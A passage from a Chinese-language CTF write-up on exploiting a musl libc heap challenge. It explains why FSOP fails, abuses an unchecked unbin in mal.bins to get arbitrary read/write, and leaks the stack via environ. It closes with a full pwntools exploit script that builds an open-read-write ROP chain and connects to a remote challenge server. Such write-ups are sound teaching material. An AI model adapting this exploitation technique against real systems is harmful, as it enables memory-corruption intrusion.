函数，这个函数就类似与glibc中的cleanup函数，也就是刷新每个FILE结构体，这里的是对每个FILE结构体调用close_file函数，我们看一下这个结构体
    struct _IO_FILE {
        unsigned int flags;
        unsigned char *rpos;
        unsigned char *rend;
        int (*close)(FILE *);
        unsigned char *wend;
        unsigned char *wpos;
        unsigned char *mustbezero_1;
        unsigned char *wbase;
        size_t (*read)(FILE *, unsigned char *, size_t);
        size_t (*write)(FILE *, const unsigned char *, size_t);
        off_t (*seek)(FILE *, off_t, int);
        unsigned char *buf;
        size_t buf_size;
        FILE *prev;
        FILE *next;
        int fd;
        int pipe_pid;
        long lockcount;
        int mode;
        volatile int lock;
        int lbf;
        void *cookie;
        off_t off;
        char *getln_buf;
        void *mustbezero_2;
        unsigned char *shend;
        off_t shlim;
        off_t shcnt;
        FILE *prev_locked;
        FILE *next_locked;
        __locale_struct *locale;
    }
可以看到结构体中存在很多歌函数指针，这里又一个close函数指针，当close_file函数调用的时候实际上就是执行的这个函数指针。也就是说如果我们可以覆写这个函数指针的话，那么这里我们就可以劫持程序流。程序中当我们输入5选择的时候就会执行exit函数。但是这里当我进行调试的时候发现，exit函数前面的三个函数调用都不见了，直接就是`_Exit(code);`
的函数调用。
    0x5555554008d0     jmp    qword ptr [rip + 0x20170a] 
    ↓
    0x7ffff7dc26c1         push   rax
    0x7ffff7dc26c2       call   _Exit 
也就是这里我们可能没办法直接使用FSOP了。那么应该怎么做呢，最直接的方法就是直接覆写返回地址从而执行orw。那么这里我们就需要泄漏一下栈地址，在当前的程序中想到的泄漏栈地址的方法就是直接通过libc[‘environ’]来进行栈地址的泄漏，但是首先我们需要拿到任意地址读写，简单的方法就是通过buflist这个数组来进行任意地址读写了。但是这个数组位于程序的bss段上，怎么分配堆块到那里呢，因为一开始我们并不知道程序的基地址，但是通过上面的分析，musl
libc中存在一个静态堆内存空间，恰好程序段上就有一个，并且是紧紧挨着buflist的。
    pwndbg> p mal.bins
    $1 = {{
        lock = {0, 0},
        head = 0x0,
        tail = 0x0
      } , {
        lock = {0, 0},
        head = 0x7ffff7ffe3b0,
        tail = 0x7ffff7ffe3b0
      }, {
        lock = {0, 0},
        head = 0x555555602070,
        tail = 0x555555602070
      }, {
        lock = {0, 0},
        head = 0x0,
        tail = 0x0
      } }
    pwndbg> x/20gx $rebase(0x202040)
    0x555555602040 :      0x0000000000000000      0x0000000000000000
    0x555555602050 :   0x0000000000000000      0x0000000000000000
    0x555555602060 :   0x0000000000000000      0x0000000000000000
    0x555555602070: 0x0000000000000001      0x0000000000000f80
    0x555555602080: 0x00007ffff7ffbe68      0x00007ffff7ffbe68
    0x555555602090: 0x0000000000000000      0x0000000000000000
    0x5555556020a0: 0x0000000000000000      0x0000000000000000
    0x5555556020b0: 0x0000000000000000      0x0000000000000000
    0x5555556020c0: 0x0000000000000000      0x0000000000000000
    0x5555556020d0: 0x0000000000000000      0x0000000000000000
这里很明显的一种思路就是覆写mal.bins中的head指针了，将其低1位改小就可以直接分配堆块到buflist上去了。但是首先我们需要拿到mal.bins的写权限，也就是分配堆块到mal.bins上。
这里由于一开始就将堆块插入到链表上，因此在我们初始进行堆块分配的时候堆块里面其实是存储有libc附近的地址的，这里一开始我们就可以泄漏的到libc的基地址。并且由于unbin的时候没有对next和prev进行检查，因此我们可以通过这里造成的漏洞覆写mal.bins中的某个链表的head为mal.bins中的某个地址，从而在下一次分配的时候直接分配到mal.bins链表上，进而覆写head指针的低位，那么这里就能做到任意地址读写了。
有了任意地址读写之后就好办了，直接通过libc[‘environ’]泄漏拿到栈地址，然后覆写返回地址就可以了。
## EXP
    # -*- coding: utf-8 -*-    import logging
    import syslog
    from pwn import *
    file_path = "./pwn_debug"
    context.arch = "amd64"
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(file_path)
    debug = 1
    if debug:
        # path = change_ld('./pwn', b'/lib/ld-musl-x86_64.so.1')
        # p = path.process(env={'LD_PRELOAD': './libc.so'})
        p = process([file_path])
        # gdb.attach(p, "b *$rebase(0xF08)")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_gadget = 0x0
    else:
        p = remote('47.104.169.32', 11543)
        libc = ELF('./libc.so')
        one_gadget = 0x0
    def add(content=b"\n"):
        p.sendlineafter(">>", "1")
        p.sendafter("the content\n", content)
    def delete(index):
        p.sendlineafter(">>", "2")
        p.sendlineafter("idx:\n", str(index))
    def show(index):
        p.sendlineafter(">>", "3")
        p.sendlineafter("idx\n", str(index))
    def edit(index, content):
        p.sendlineafter(">>", "4")
        p.sendlineafter("idx:\n", str(index))
        p.sendafter("Content\n", content)
    def shutdown():
        p.sendlineafter(">>", "5")
    add(b"a" * 0x8)
    show(0)
    p.recvuntil("a" * 0x8)
    libc.address = u64(p.recvline().strip().ljust(8, b"\x00")) - 0x292e50
    stderr = libc.address + 0x292100
    stdin = libc.address + 0x292200
    binmap = libc.address + 0x292ac0
    brk = libc.address + 0x295050
    bin = libc.address + 0x292e10
    system = libc.address + 0x42688
    chunk_add = libc.address + 0x2953c0
    environ = libc.address + 0x294fd8
    add(b"a" * 0x8)
    delete(0)
    next = bin - 0x10
    prev = stderr
    edit(0, p64(next) + p64(next) + b"./flag".ljust(8, b"\x00")*0x10)
    add(p64(chunk_add)*2)
    add()
    edit(3, b"\x00"*0x60 + p64(0) + b"\x30")
    add(p64(0)*6)
    show(0)
    elf.address = u64(p.recvline().strip().ljust(8, b"\x00")) - 0x202040
    buf_address = elf.address + 0x202040
    payload = p64(buf_address) + p64(environ) + p64(0)*4
    edit(0, payload)
    show(1)
    stack_address = u64(p.recvline().strip().ljust(8, b"\x00"))
    payload =p64(buf_address) + p64(stack_address - 0x78) + p64(0)*4
    edit(0, payload)
    p_rdi_r = 0x0000000000014862 + libc.address
    p_rsi_r = 0x000000000001c237 + libc.address
    p_rdx_r = 0x000000000001bea2 + libc.address
    p_rax_r = 0x000000000001b826 + libc.address
    leave = 0x000000000001b26d + libc.address
    ret = 0x000000000004c70a + libc.address
    syscall = 0x00000000000247d5 + libc.address
    flag_str_address = chunk_add + 0x20
    flag_address = chunk_add + 0x30
    orw = flat([
        p_rdi_r, flag_str_address,
        p_rsi_r, 0,
        p_rax_r, 2,
        syscall,
        p_rdi_r, 3,
        p_rsi_r, flag_address,
        p_rdx_r, 0x30,
        p_rax_r, 0,
        syscall,
        p_rdi_r, 1,
        p_rsi_r, flag_address,
        p_rdx_r, 0x30,
        p_rax_r, 1,
        syscall
    ])
    payload = orw
    edit(1, payload)
    p.interactive()